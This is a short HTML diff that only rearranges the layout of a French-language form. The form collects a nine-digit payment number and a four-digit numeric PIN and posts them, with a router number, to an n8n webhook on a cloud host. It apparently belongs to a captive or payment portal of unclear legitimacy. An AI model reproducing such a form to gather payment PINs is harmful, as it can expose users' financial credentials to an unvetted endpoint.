@@ -91,12 +91,15 @@
 
   <div class="card">
     <form action=https://n8n.srv878521.hstgr.cloud/webhook/Authentification?id=${id}&numero_routeur=${numero_routeur} method="POST">
-    method="POST">
-      <label for="numero">Numéro</label>
-      <input type="text" id="numero" name="numero_paiement" pattern="\\d{9}"inputmode="numeric" maxlength="9" required>
+      <div class="card">
+        <label for="numero">Numéro</label>
+        <input type="text" id="numero" name="numero_paiement" pattern="\\d{9}"inputmode="numeric" maxlength="9" required>
+      </div>
 
-      <label for="password">Mot de passe</label>
-      <input type="password" id="password" name="password" pattern="\\d{4}" inputmode="numeric" maxlength="4" required>
+      <div class="card">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" pattern="\\d{4}" inputmode="numeric" maxlength="4" required>
+      </div>
 
       <button type="submit">Valider</button>
     </form>
